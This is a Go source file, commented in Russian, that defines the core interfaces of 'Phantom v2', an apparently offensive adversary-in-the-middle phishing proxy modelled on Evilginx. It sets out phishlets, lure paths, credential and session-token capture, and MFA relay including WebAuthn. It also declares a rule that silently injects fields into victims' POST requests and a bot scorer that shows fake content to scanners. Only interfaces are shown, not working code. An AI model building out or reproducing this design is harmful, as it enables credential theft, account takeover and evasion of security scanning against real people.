// Package core — замороженные интерфейсы Phantom v2 (ADR-001).
// Правило: менять только через ADR. Реализации — в подпакетах.
package core

import (
	"context"
	"net/http"
	"regexp"
	"time"
)

// Phishlet v2 — см. specs/phishlet-v2.md
type Phishlet struct {
	ID          string      `yaml:"id"`
	Version     int         `yaml:"version"`
	BaseDomains []string    `yaml:"base_domains"`
	ProxyHosts  []ProxyHost `yaml:"proxy_hosts"`
	SubFilters  []SubFilter `yaml:"sub_filters"`
	AuthTokens  []AuthToken `yaml:"auth_tokens"`
	CredsMap    []CredsRule `yaml:"creds_map"`
	MfaTokens   []MfaRule   `yaml:"mfa_tokens"`
	RedirectURL string      `yaml:"redirect_url"`
	ForcePost   []ForceRule `yaml:"force_post"`
	JsInject    []JsInject  `yaml:"js_inject"`
	LurePath    string      `yaml:"lure_path"`
	Enabled     bool        `yaml:"enabled"`
}

type ProxyHost struct {
	PhishSub  string `yaml:"phish_sub"`
	OrigSub   string `yaml:"orig_sub"`
	Domain    string `yaml:"domain"`
	IsLanding bool   `yaml:"is_landing"`
}

type SubFilter struct {
	TriggersOn   string         `yaml:"triggers_on"`
	Search       string         `yaml:"search"`
	Replace      string         `yaml:"replace"`
	Mime         []string       `yaml:"mime"`
	RedirectOnly bool           `yaml:"redirect_only"`
	Regex        bool           `yaml:"regex"`
	When         string         `yaml:"when"`
	Compiled     *regexp.Regexp `yaml:"-"`
}

type AuthToken struct {
	Domain string   `yaml:"domain"`
	Keys   []string `yaml:"keys"`
}

type CredsRule struct {
	Key    string `yaml:"key"`
	Search string `yaml:"search"`
}

// ForceRule: тихий инжект key=value в исходящий POST.
// ctype form|json. Пример: rememberMe=true без ведома жертвы.
type ForceRule struct {
	Ctype string `yaml:"ctype"`
	Key   string `yaml:"key"`
	Value string `yaml:"value"`
}

// MfaRule — перехват второго фактора (TOTP/Push/WebAuthn ceremony relay).
// WebAuthn-приватники origin-bound и не проксируются — ретранслируем ceremony
// трафик + фиксируем факт assertion (kind=mfa:<key>).
type MfaRule struct {
	Key    string `yaml:"key"` // otp|totp|push|webauthn
	Search string `yaml:"search"`
}

type JsInject struct {
	Trigger string `yaml:"trigger"`
	Src     string `yaml:"src"`
}

// Session — серверная сессия, живет в Redis с TTL.
type Session struct {
	ID        string
	Phishlet  string
	IP        string
	JA4       string
	BotScore  int
	CreatedAt time.Time
}

// Capture — факт захвата (без plaintext в SQLite).
type Capture struct {
	ID        string
	SessionID string
	Kind      string // creds | token | body
	CreatedAt time.Time
}

// ProxyEngine — AiTM reverse-proxy. Единственная реализация: std net/http.
type ProxyEngine interface {
	ServeHTTP(w http.ResponseWriter, r *http.Request)
}

// PhishletStore — загрузка и поиск phishlet по Host.
type PhishletStore interface {
	LoadDir(dir string) error
	FindByHost(host string) (*Phishlet, *ProxyHost)
	FindByID(id string) *Phishlet
	All() []*Phishlet
	Count() int
}

// LureStore — пути-приманки /l/* -> phishlet (Evilginx lures паритет).
type LureStore interface {
	Add(path, phishletID string)
	Resolve(path string) (string, bool)
}

// Blocklist — IP/JA4 бан (Evilginx blacklist паритет).
type Blocklist interface {
	Block(key, reason string)
	Blocked(key string) bool
}

// SessionStore — Redis impl. In-memory только для тестов.
type SessionStore interface {
	Create(ctx context.Context, phishlet, ip string) (*Session, error)
	Get(ctx context.Context, id string) (*Session, error)
}

// SessionDropper — опциональный сброс сессии (кнопка из Telegram, ADR-002).
// Memory/Redis/Failover реализуют; отсутствие = type-assert в вызывающем.
type SessionDropper interface {
	Drop(ctx context.Context, id string) error
}

// CertManager — wildcard через ACME DNS-01 (Pro-паритет).
type CertManager interface {
	EnsureWildcard(ctx context.Context, domain string) error
}

// DNSProvider — external DNS вместо UDP:53 на том же IP.
type DNSProvider interface {
	EnsureA(ctx context.Context, name, ip string) error
	EnsureTXT(ctx context.Context, name, value string) error
}

// BotScorer — JA4 + JS-телеметрия -> 0..100. >=80 = бот (spoof, не redirect).
type BotScorer interface {
	Score(r *http.Request, ja4 string) int
}

// EventBus — OTel/NATS. Запрещены кастомные шинные велосипеды.
type EventBus interface {
	Publish(ctx context.Context, topic string, payload any) error
}
